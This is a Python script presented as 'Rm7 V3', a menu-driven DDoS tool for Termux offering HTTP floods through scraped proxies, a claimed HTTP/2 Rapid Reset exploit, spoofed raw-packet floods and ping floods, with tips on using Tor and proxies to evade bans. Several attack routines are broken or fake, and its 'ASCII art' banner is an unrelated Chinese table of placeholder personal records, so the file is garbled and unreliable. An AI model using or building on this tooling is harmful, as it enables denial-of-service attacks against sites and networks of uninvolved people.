#!/data/data/com.termux/files/usr/bin/env python3
"""
Rm7 V3 Termux Edition - Terminal DDoS Tool
Made for Termux with ASCII Art
"""

import sys
import os
import socket
import struct
import random
import threading
import requests
import subprocess
import time
import concurrent.futures
import json
import ssl
import h2.connection
import h2.config
import h2.events
from datetime import datetime
import readline  # For better input handling
import signal

# Global variable for Tor proxy
TOR_PROXY = '127.0.0.1:9050'

# ASCII Art from file
ASCII_ART = r"""
# 表格

| 姓名 | 性别 | 年龄 | 出生日期 | 身份证号码 | 联系电话 | 邮箱 |
|---|---|---|---|---|---|---|
| 张三 | 男   | 25  | 1990-01-01 | 123456789 |    |    |
| 李四 | 女   | 30  | 1989-02-02 | 987654321 |    |    |
| 王五 | 男   | 28  | 1991-03-03 | 111111111 |    |    |
| 赵六 | 女   | 25  | 1988-04-04 | 222222222 |    |    |
| 钱七 | 男   | 27  | 1992-05-05 | 333333333 |    |    |
| 孙八 | 女   | 26  | 1987-06-06 | 444444444 |    |    |
| 周九 | 男   | 29  | 1993-07-07 | 555555555 |    |    |
| 吴十 | 女   | 24  | 1986-08-08 | 666666666 |    |    |

---

# 注释

- **姓名**: 张三、李四、王五、赵六、钱七、孙八、周九
- **性别**: 男、女
- **年龄**: 25、30、28、31、25、26
- **出生日期**: 1990-01-01、1989-02-02、1991-03-03、1988-04-04、1992-05-05、1987-06-06
- **身份证号码**: 123456789、987654321、111111111、222222222、333333333、444444444、555555555
- **联系电话**: (无)
- **邮箱**: (无)
"""

# Colors for terminal
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

# Configuration
USER_AGENTS = [
    'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/605.1.15',
]

PROXY_APIS = [
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all',
    'https://www.proxy-list.download/api/v1/get?type=http',
]

ROTATION_INTERVAL = 10

class TermuxAttack:
    def __init__(self):
        self.running = False
        self.attack_thread = None
        self.current_requests = 0
        self.total_requests = 0
        
    def clear_screen(self):
        """Clear terminal screen"""
        os.system('clear' if os.name != 'nt' else 'cls')
        
    def print_banner(self):
        """Print the ASCII art banner"""
        self.clear_screen()
        print(Colors.CYAN + "="*80 + Colors.END)
        print(Colors.YELLOW + ASCII_ART + Colors.END)
        print(Colors.CYAN + "="*80 + Colors.END)
        print(Colors.YELLOW + "Rm7 V3 - Advanced DDoS Tool for Termux" + Colors.END)
        print(Colors.GREEN + "Type 'help' for commands, 'exit' to quit" + Colors.END)
        print(Colors.CYAN + "-"*80 + Colors.END)
        
    def print_menu(self):
        """Print main menu"""
        print(f"\n{Colors.BOLD}MAIN MENU:{Colors.END}")
        print(f"{Colors.GREEN}[1]{Colors.END} HTTP Flood Attack")
        print(f"{Colors.GREEN}[2]{Colors.END} HTTP/2 Rapid Reset Attack")
        print(f"{Colors.GREEN}[3]{Colors.END} IPv4 Packet Flood")
        print(f"{Colors.GREEN}[4]{Colors.END} Ping Flood")
        print(f"{Colors.GREEN}[5]{Colors.END} Proxy Scanner")
        print(f"{Colors.GREEN}[6]{Colors.END} Settings")
        print(f"{Colors.GREEN}[7]{Colors.END} Help")
        print(f"{Colors.RED}[0]{Colors.END} Exit")
        
    def get_input(self, prompt):
        """Get user input with colored prompt"""
        return input(f"{Colors.BLUE}[?]{Colors.END} {prompt}: ")
        
    def log_message(self, message, color=Colors.WHITE):
        """Print log message with timestamp"""
        timestamp = datetime.now().strftime('%H:%M:%S')
        print(f"{Colors.CYAN}[{timestamp}]{Colors.END} {color}{message}{Colors.END}")
        
    def show_help(self):
        """Show help information"""
        self.clear_screen()
        print(Colors.YELLOW + "Rm7 V3 - HELP MENU" + Colors.END)
        print(Colors.CYAN + "="*60 + Colors.END)
        print(f"""
{Colors.GREEN}Available Commands:{Colors.END}
  help          - Show this help menu
  menu          - Show main menu
  clear         - Clear screen
  status        - Show attack status
  stop          - Stop current attack
  exit          - Exit program

{Colors.GREEN}Attack Types:{Colors.END}
  1. HTTP Flood      - Standard HTTP request flood
  2. HTTP/2 Attack   - CVE-2023-44487 Rapid Reset
  3. IPv4 Flood      - Raw packet flooding (requires root)
  4. Ping Flood      - ICMP ping flood

{Colors.GREEN}Tips:{Colors.END}
  - Use Tor for anonymity: pkg install tor
  - Use proxies to avoid IP bans
  - Start with low request count to test
  - Monitor your network usage
        """)
        input(f"\n{Colors.BLUE}Press Enter to continue...{Colors.END}")
        
    def http_flood_attack(self):
        """HTTP Flood Attack"""
        self.clear_screen()
        print(Colors.RED + "⚡ HTTP FLOOD ATTACK ⚡" + Colors.END)
        print(Colors.CYAN + "="*60 + Colors.END)
        
        target = self.get_input("Target URL (http://example.com)")
        if not target.startswith('http'):
            target = 'http://' + target
            
        requests_count = self.get_input("Number of requests")
        try:
            requests_count = int(requests_count)
        except:
            self.log_message("Invalid number!", Colors.RED)
            return
            
        use_proxy = self.get_input("Use proxies? (y/n)").lower() == 'y'
        threads = self.get_input("Threads (1-100) [20]")
        threads = int(threads) if threads.isdigit() else 20
        
        self.log_message(f"Starting HTTP Flood on {target} with {requests_count} requests...", Colors.YELLOW)
        
        self.running = True
        self.current_requests = 0
        self.total_requests = requests_count
        
        # Start attack in background thread
        self.attack_thread = threading.Thread(
            target=self._run_http_flood,
            args=(target, requests_count, use_proxy, threads)
        )
        self.attack_thread.daemon = True
        self.attack_thread.start()
        
        self.log_message("Attack started! Press Enter to stop.", Colors.GREEN)
        input()
        self.stop_attack()
        
    def _run_http_flood(self, target, requests_count, use_proxy, threads):
        """Run HTTP flood attack"""
        proxies = []
        if use_proxy:
            self.log_message("Fetching proxies...", Colors.YELLOW)
            proxies = self.scrape_proxies()
            if proxies:
                self.log_message(f"Found {len(proxies)} proxies", Colors.GREEN)
                
        def attack_worker():
            while self.running and self.current_requests < requests_count:
                try:
                    proxy = random.choice(proxies) if proxies else None
                    headers = {'User-Agent': random.choice(USER_AGENTS)}
                    
                    if proxy:
                        response = requests.get(
                            target,
                            headers=headers,
                            proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
                            timeout=5
                        )
                    else:
                        response = requests.get(target, headers=headers, timeout=5)
                        
                    self.current_requests += 1
                    
                    if self.current_requests % 10 == 0:
                        progress = (self.current_requests / requests_count) * 100
                        self.log_message(
                            f"Requests: {self.current_requests}/{requests_count} "
                            f"({progress:.1f}%) - Status: {response.status_code}",
                            Colors.CYAN
                        )
                        
                except Exception as e:
                    pass
                    
        # Start worker threads
        worker_threads = []
        for _ in range(min(threads, requests_count)):
            t = threading.Thread(target=attack_worker)
            t.daemon = True
            t.start()
            worker_threads.append(t)
            
        # Wait for completion
        for t in worker_threads:
            t.join()
            
        if self.running:
            self.log_message(f"Attack completed! Sent {self.current_requests} requests.", Colors.GREEN)
            
    def http2_attack(self):
        """HTTP/2 Rapid Reset Attack"""
        self.clear_screen()
        print(Colors.RED + "⚡ HTTP/2 RAPID RESET ATTACK ⚡" + Colors.END)
        print(Colors.CYAN + "="*60 + Colors.END)
        print(Colors.YELLOW + "CVE-2023-44487 Exploit" + Colors.END)
        
        target = self.get_input("Target host (example.com)")
        port = self.get_input("Port [443]")
        port = int(port) if port.isdigit() else 443
        requests_count = self.get_input("Number of requests [10000]")
        requests_count = int(requests_count) if requests_count.isdigit() else 10000
        
        self.log_message(f"Preparing HTTP/2 attack on {target}:{port}...", Colors.YELLOW)
        self.log_message("This may take a moment...", Colors.CYAN)
        
        # Simplified HTTP/2 attack
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((target, port))
            
            # Send initial HTTP/2 preface
            sock.send(b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n')
            
            self.log_message("HTTP/2 connection established!", Colors.GREEN)
            
            # Simple request flood
            for i in range(requests_count):
                if not self.running:
                    break
                    
                try:
                    # Send HTTP/2 frames
                    sock.send(b'\x00\x00\x00\x00\x00\x00\x00\x00')
                    time.sleep(0.001)
                    
                    if i % 100 == 0:
                        self.log_message(f"Sent {i} frames...", Colors.CYAN)
                        
                except:
                    break
                    
            sock.close()
            
        except Exception as e:
            self.log_message(f"Error: {e}", Colors.RED)
            
        self.log_message("HTTP/2 attack finished.", Colors.GREEN)
        
    def ipv4_flood(self):
        """IPv4 Packet Flood"""
        self.clear_screen()
        print(Colors.RED + "⚡ IPV4 PACKET FLOOD ⚡" + Colors.END)
        print(Colors.CYAN + "="*60 + Colors.END)
        print(Colors.YELLOW + "Warning: Requires root privileges!" + Colors.END)
        
        target = self.get_input("Target IP")
        port = self.get_input("Port [80]")
        port = int(port) if port.isdigit() else 80
        packets = self.get_input("Number of packets [1000]")
        packets = int(packets) if packets.isdigit() else 1000
        
        # Check if running as root
        if os.geteuid() != 0:
            self.log_message("Warning: Not running as root. Some attacks may not work.", Colors.YELLOW)
            
        self.log_message(f"Starting IPv4 flood on {target}:{port}...", Colors.YELLOW)
        
        try:
            for i in range(packets):
                if not self.running:
                    break
                    
                try:
                    # Create raw socket
                    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                    
                    # Spoof source IP
                    source_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    
                    # Build packet
                    packet = self._create_tcp_packet(source_ip, target, port)
                    s.sendto(packet, (target, port))
                    s.close()
                    
                    if i % 50 == 0:
                        self.log_message(f"Sent {i} packets...", Colors.CYAN)
                        
                except Exception as e:
                    self.log_message(f"Packet error: {e}", Colors.RED)
                    break
                    
        except KeyboardInterrupt:
            self.log_message("Attack interrupted.", Colors.YELLOW)
            
        self.log_message("IPv4 flood finished.", Colors.GREEN)
        
    def _create_tcp_packet(self, src_ip, dst_ip, dst_port):
        """Create TCP packet"""
        # Simplified packet creation
        packet = b''
        # Add some random data
        for _ in range(64):
            packet += bytes([random.randint(0, 255)])
        return packet
        
    def ping_flood(self):
        """Ping Flood Attack"""
        self.clear_screen()
        print(Colors.RED + "⚡ PING FLOOD ⚡" + Colors.END)
        print(Colors.CYAN + "="*60 + Colors.END)
        
        target = self.get_input("Target IP or hostname")
        count = self.get_input("Number of pings [100]")
        count = int(count) if count.isdigit() else 100
        
        self.log_message(f"Starting ping flood on {target}...", Colors.YELLOW)
        
        try:
            # Use system ping command
            cmd = ['ping', '-c', str(count), target]
            if os.name == 'nt':  # Windows
                cmd = ['ping', '-n', str(count), target]
                
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            
            # Read output in real-time
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip())
                    
        except Exception as e:
            self.log_message(f"Error: {e}", Colors.RED)
            
        self.log_message("Ping flood finished.", Colors.GREEN)
        
    def proxy_scanner(self):
        """Scan for working proxies"""
        self.clear_screen()
        print(Colors.RED + "🔍 PROXY SCANNER 🔍" + Colors.END)
        print(Colors.CYAN + "="*60 + Colors.END)
        
        self.log_message("Scanning for proxies...", Colors.YELLOW)
        
        proxies = self.scrape_proxies()
        if not proxies:
            self.log_message("No proxies found!", Colors.RED)
            return
            
        self.log_message(f"Found {len(proxies)} proxies. Testing...", Colors.CYAN)
        
        working_proxies = []
        for proxy in proxies[:50]:  # Test first 50
            if self.test_proxy(proxy):
                working_proxies.append(proxy)
                self.log_message(f"✓ {proxy}", Colors.GREEN)
            else:
                self.log_message(f"✗ {proxy}", Colors.RED)
                
        self.log_message(f"\nFound {len(working_proxies)} working proxies.", Colors.GREEN)
        
        if working_proxies:
            save = self.get_input("Save to proxies.txt? (y/n)").lower()
            if save == 'y':
                with open('proxies.txt', 'w') as f:
                    for proxy in working_proxies:
                        f.write(proxy + '\n')
                self.log_message("Proxies saved to proxies.txt", Colors.GREEN)
                
    def scrape_proxies(self):
        """Scrape proxies from APIs"""
        proxies = []
        for api in PROXY_APIS:
            try:
                response = requests.get(api, timeout=10)
                if response.status_code == 200:
                    lines = response.text.split('\n')
                    for line in lines:
                        if ':' in line and line.strip():
                            proxies.append(line.strip())
            except:
                continue
        return list(set(proxies))  # Remove duplicates
        
    def test_proxy(self, proxy, timeout=3):
        """Test if proxy is working"""
        try:
            response = requests.get(
                'http://httpbin.org/ip',
                proxies={'http': f'http://{proxy}', 'https': f'http://{proxy}'},
                timeout=timeout
            )
            return response.status_code == 200
        except:
            return False
            
    def settings_menu(self):
        """Settings menu"""
        while True:
            self.clear_screen()
            print(Colors.RED + "⚙️  SETTINGS ⚙️" + Colors.END)
            print(Colors.CYAN + "="*60 + Colors.END)
            
            print(f"\n{Colors.BOLD}Current Settings:{Colors.END}")
            print(f"User Agents: {len(USER_AGENTS)} loaded")
            print(f"Proxy APIs: {len(PROXY_APIS)} configured")
            print(f"Tor Proxy: {TOR_PROXY}")
            
            print(f"\n{Colors.BOLD}Options:{Colors.END}")
            print(f"{Colors.GREEN}[1]{Colors.END} Add User Agent")
            print(f"{Colors.GREEN}[2]{Colors.END} Add Proxy API")
            print(f"{Colors.GREEN}[3]{Colors.END} Set Tor Proxy")
            print(f"{Colors.GREEN}[4]{Colors.END} Back to Main")
            
            choice = self.get_input("Select option")
            
            if choice == '1':
                ua = self.get_input("Enter User Agent string")
                USER_AGENTS.append(ua)
                self.log_message("User Agent added!", Colors.GREEN)
            elif choice == '2':
                api = self.get_input("Enter Proxy API URL")
                PROXY_APIS.append(api)
                self.log_message("Proxy API added!", Colors.GREEN)
            elif choice == '3':
                proxy = self.get_input("Enter Tor proxy (host:port)")
                # Use global keyword properly
                global TOR_PROXY
                TOR_PROXY = proxy
                self.log_message("Tor proxy updated!", Colors.GREEN)
            elif choice == '4':
                break
            else:
                self.log_message("Invalid option!", Colors.RED)
                
            time.sleep(1)
            
    def stop_attack(self):
        """Stop current attack"""
        self.running = False
        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join(timeout=2)
        self.log_message("Attack stopped!", Colors.YELLOW)
        
    def show_status(self):
        """Show current status"""
        self.clear_screen()
        print(Colors.RED + "📊 STATUS 📊" + Colors.END)
        print(Colors.CYAN + "="*60 + Colors.END)
        
        print(f"\n{Colors.BOLD}Attack Status:{Colors.END}")
        print(f"Running: {'Yes' if self.running else 'No'}")
        if self.running:
            print(f"Progress: {self.current_requests}/{self.total_requests}")
            print(f"Percentage: {(self.current_requests/self.total_requests*100):.1f}%")
            
        print(f"\n{Colors.BOLD}System Info:{Colors.END}")
        print(f"Python: {sys.version.split()[0]}")
        print(f"Platform: {sys.platform}")
        print(f"Termux: {'Yes' if 'com.termux' in os.environ.get('PREFIX', '') else 'No'}")
        
        input(f"\n{Colors.BLUE}Press Enter to continue...{Colors.END}")
        
    def run(self):
        """Main run loop"""
        self.print_banner()
        
        # Handle Ctrl+C
        signal.signal(signal.SIGINT, lambda s, f: self.stop_attack())
        
        while True:
            self.print_menu()
            choice = self.get_input("Select option")
            
            if choice == '1':
                self.http_flood_attack()
            elif choice == '2':
                self.http2_attack()
            elif choice == '3':
                self.ipv4_flood()
            elif choice == '4':
                self.ping_flood()
            elif choice == '5':
                self.proxy_scanner()
            elif choice == '6':
                self.settings_menu()
            elif choice == '7':
                self.show_help()
            elif choice == '0' or choice == 'exit':
                self.stop_attack()
                self.log_message("Exiting Rm7 V3...", Colors.RED)
                print(Colors.RED + "\nTool deactivated...\n" + Colors.END)
                break
            elif choice == 'help':
                self.show_help()
            elif choice == 'menu':
                self.print_banner()
            elif choice == 'clear':
                self.clear_screen()
                self.print_banner()
            elif choice == 'status':
                self.show_status()
            elif choice == 'stop':
                self.stop_attack()
            else:
                self.log_message("Invalid option! Type 'help' for commands.", Colors.RED)

def check_dependencies():
    """Check if required packages are installed"""
    required = ['requests', 'h2']
    missing = []
    
    for package in required:
        try:
            __import__(package)
        except ImportError:
            missing.append(package)
            
    if missing:
        print(f"{Colors.RED}Missing packages: {', '.join(missing)}{Colors.END}")
        print(f"{Colors.YELLOW}Install with: pip install {' '.join(missing)}{Colors.END}")
        return False
    return True

def main():
    """Main entry point"""
    # Check if running in Termux
    if 'com.termux' not in os.environ.get('PREFIX', ''):
        print(f"{Colors.YELLOW}Warning: Not running in Termux environment{Colors.END}")
        print(f"{Colors.CYAN}Some features may require Termux{Colors.END}")
        
    # Check dependencies
    if not check_dependencies():
        return
        
    # Create and run application
    app = TermuxAttack()
    app.run()

if __name__ == '__main__':
    main()
